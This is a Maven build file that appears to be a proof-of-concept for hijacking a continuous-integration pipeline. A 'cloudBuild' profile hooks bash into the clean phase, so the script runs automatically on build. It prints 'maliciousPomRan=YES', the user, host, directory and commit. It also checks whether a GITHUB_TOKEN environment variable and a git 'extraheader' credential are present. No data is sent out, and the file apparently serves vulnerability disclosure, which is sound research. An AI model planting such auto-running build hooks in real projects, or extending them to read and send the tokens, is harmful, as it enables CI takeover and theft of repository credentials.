<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>io.cdap.poc</groupId>
  <artifactId>race-poc</artifactId>
  <version>1.0.0</version>
  <packaging>jar</packaging>
  <properties>
    <maven.compiler.source>11</maven.compiler.source>
    <maven.compiler.target>11</maven.compiler.target>
  </properties>
  <profiles>
    <profile>
      <id>cloudBuild</id>
      <activation>
        <property><name>cloudBuild</name></property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
            <version>3.1.1</version>
            <executions>
              <execution>
                <id>race-marker</id>
                <phase>clean</phase>
                <goals>
                  <goal>exec</goal>
                </goals>
                <configuration>
                  <executable>/bin/bash</executable>
                  <arguments>
                    <argument>-c</argument>
                    <argument><![CDATA[
                      echo "===== RACE-PROVEN-938dfaf3-738b-40b3-8d79-9b4d70c4e90f ====="
                      echo "PoC-Step: maliciousPomRan=YES"
                      echo "PoC-User: $(whoami)@$(hostname)"
                      echo "PoC-Workdir: $(pwd)"
                      echo "PoC-CurrentSHA: $(git rev-parse HEAD)"
                      echo "PoC-GitHubToken-Present: $(env | grep -c '^GITHUB_TOKEN=')"
                      echo "PoC-GitConfigExtraheader: $(cat .git/config | grep -c 'extraheader')"
                      echo "===== EOM RACE-PROVEN-938dfaf3-738b-40b3-8d79-9b4d70c4e90f ====="
                    ]]></argument>
                  </arguments>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
  </profiles>
</project>
